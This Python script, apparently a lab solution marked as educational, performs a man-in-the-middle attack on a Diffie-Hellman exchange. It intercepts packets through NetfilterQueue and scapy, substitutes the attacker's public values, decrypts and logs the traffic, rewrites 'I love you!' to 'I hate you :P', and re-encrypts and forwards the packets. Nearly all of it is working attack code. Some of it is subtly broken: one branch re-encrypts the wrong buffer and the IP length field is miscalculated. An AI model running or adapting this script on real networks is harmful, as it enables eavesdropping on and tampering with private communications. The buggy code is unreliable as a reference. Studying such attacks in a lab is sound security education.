#!/usr/bin/python3

"""
Copyright Jakob Kristersson (2026)
THIS MODULE IS ONLY FOR EDUCATIONAL PURPOSES
"""
import copy
import sys
import os
import socket
import hashlib
import pyaes
import subprocess

from pyaes import AES
from netfilterqueue import NetfilterQueue
from scapy.all import send
from scapy.layers.inet import *
from scapy.layers.inet6 import *
from scapy.layers.l2 import *

#
# From the M2P3 HA we know that it is Bob initializing the TCP handshake (Alice is the server)
# Therefore source IP of SYN message is Bob, source IP of SYN/ACK is Alice
#

p = int('ffffffffffffffffc90fdaa22168c234c4c6628b80dc1cd129024e088a67cc74020bbea63b139b22514a08798e3404ddef9519b3cd3a431b302b0a6df25f14374fe1356d6d51c245e485b576625e7ec6f44c42e9a637ed6b0bff5cb6f406b7edee386bfb5a899fa5ae9f24117c4b1fe649286651ece45b3dc2007cb8a163bf0598da48361c55d39a69163fa8fd24cf5f83655d23dca3ad961c62f356208552bb9ed529077096966d670c354e4abc9804f1746c08ca237327ffffffffffffffff', 16)
g = 2 # the generator of the group (Z/pZ)*
listenPort = 6004

interface = "br-lan"

THE_GOOD_MESSAGE = "I love you!"
MY_EVIL_MESSAGE = "I hate you :P"

def handle_captured_data(data: str) -> str:
    try:
        print(f"Eevesdropped:{data}")
        if str(THE_GOOD_MESSAGE) in data:
            data = str(MY_EVIL_MESSAGE)
    finally:
        return data

def generate_random(N, bits=1536):
    """Generate a random number with bits=1536, then mod N."""
    byte = bits // 8
    rnd_num = os.urandom(byte)
    # ensure the number of bits is as high as 'bits'
    while rnd_num[0] < 128:
        rnd_num = os.urandom(byte)

    # convert from ascii to hex to a decimal integer
    rnd_num = int(''.join(format(i, 'x') for i in rnd_num), 16)
    return rnd_num % N

# Separate them to comply with principle of single key usage.
e1 = generate_random(p) # Eve's f1st private exponent
Eve1 = pow(g, e1, p)

e2 = generate_random(p) # Eve's 2nd private exponent
Eve2 = pow(g, e2, p)

Alice = 0
Alice_IP = "0.0.0.0"
Alice_key = bytes()

Bob = 0
Bob_IP = "0.0.0.0"
Bob_key = bytes()

def create_key(Num:int, eve_exponent) -> bytes:
    dh = pow(Num, eve_exponent, p)
    return hashlib.sha256(bytes.fromhex(hex(dh)[2:])).digest()

def encrypt(plaintext: bytes, key: bytes):
    aes = pyaes.AESModeOfOperationECB(key)
    encrypter = pyaes.Encrypter(aes)
    ciphertext = encrypter.feed(plaintext)
    ciphertext += encrypter.feed()
    return ciphertext

def decrypt(ciphertext: bytes, key: bytes):
    aes = pyaes.AESModeOfOperationECB(key)
    decrypter = pyaes.Decrypter(aes)
    plaintext = decrypter.feed(ciphertext)
    plaintext += decrypter.feed()
    return plaintext

def int_to_bytes(n: int, padding: int = 0) -> bytes:
    n_byte_len = (n.bit_length() + 7) // 8
    return n.to_bytes(padding if padding >= n_byte_len else n_byte_len, 'big')

def bytes_to_int(b: bytes) -> int:
    return int.from_bytes(b, 'big')

def is_handshake(pkt):
    if pkt.haslayer(TCP):
        flags = pkt[TCP].flags
        # 1. Check for SYN (First step)
        if flags == 'S':
            return "SYN"
        # 2. Check for SYN-ACK (Second step)
        elif flags == 'SA':
            return "SYN-ACK"
        # 3. Check for ACK (Third step)
        # Note: Standard ACKs also occur during data transfer.
        # Handshake ACKs usually have no payload.
        elif flags == 'A' and len(pkt[TCP].payload) == 0:
            return "Possible Handshake ACK (Step 3)"
    return None

def format_number(num) -> bytes:
    return format(num, 'x').encode('utf8')
     
def swap_tcp_payload(pkt, new_payload):
    pkt[TCP].payload = new_payload
    pkt[IP].len = len(new_payload)

# from the nft we know it is a tcp packet with sport or dport = 6004
def process_packet(packet):
    global Alice, Alice_IP, Alice_key
    global Bob, Bob_IP, Bob_key
    pkt = conf.raw_layer(packet)

    # Let the handshake pass, but reset out internal state then.
    handshake_type = is_handshake(pkt)
    if handshake_type != None:
        if handshake_type == "SYN":
            Bob = 0
            Bob_IP = pkt[IP].src
            Bob_key = bytes()
        if handshake_type == "SYN-ACK" and pkt[IP].dst == Bob_IP:
            Alice = 0
            Alice_IP = pkt[IP].src
            Alice_key = bytes()
        if handshake_type == "Possible Handshake ACK (Step 3)":
            pass #TODO (though does not seem to matter)
        
        print("Handshake!")
        packet.accept()
        return

    data = bytes(pkt[TCP].payload)
    
    # Ignore empty packets:
    if len(data) == 0:
        packet.accept()
        return

    if Alice == 0 and pkt[IP].src == Alice_IP and len(data) == 384:
        Alice = int(data.decode(), 16)
        Alice_key = pow(Alice, e1, p) #create_key(Alice)
        
        packet.drop()
        swap_tcp_payload(pkt, format_number(Eve1))
        send(pkt) # Send to Bob
        subprocess.run(["LED", "B", "SOLID"])
        return

    if Bob == 0 and pkt[IP].src == Bob_IP and len(data) == 384:
        Bob = int(data.decode(), 16)
        Bob_key = pow(Bob, e2, p) #create_key(Bob)
        
        packet.drop()
        swap_tcp_payload(pkt, format_number(Eve2))
        send(pkt) # Send to Alice
        subprocess.run(["LED", "Y", "SOLID"])
        return 
    
    dec = lambda c, key : int_to_bytes(int(c.decode(), 16) ^ key).decode() # Converts bytes ciphertext to string plaintext
    enc = lambda p, key : format_number(bytes_to_int(p.encode()) ^ key) # Converts string plaintext to bytes ciphertext

    if (Alice != 0) and (Bob != 0) and pkt[IP].src == Alice_IP:
        plaintext = dec(data, Alice_key)
        plaintext = handle_captured_data(plaintext)
        ciphertext = enc(data, Bob_key)

        packet.drop()
        swap_tcp_payload(pkt, ciphertext)
        send(pkt) # Send re-encrypted packet to Bob
        subprocess.run(["LED", "M", "SOLID"])
        return
    
    if (Alice != 0) and (Bob != 0) and pkt[IP].src == Bob_IP:
        plaintext = dec(data, Bob_key)
        plaintext = handle_captured_data(plaintext)
        ciphertext = enc(plaintext, Alice_key)

        packet.drop()
        swap_tcp_payload(pkt, ciphertext)
        send(pkt) # Send re-encrypted packet to Alice
        subprocess.run(["LED", "W", "SOLID"])
        return
    
    # If anything else, then I don't know what to do.
    print("Something unexpected happened.")
    packet.accept()
    return

if __name__ == "__main__":

    nfqueue = NetfilterQueue()
    nfqueue.bind(1, process_packet)
    try:
        print("Running... Press Ctrl+C to stop.")
        nfqueue.run()
    finally:
        nfqueue.unbind()
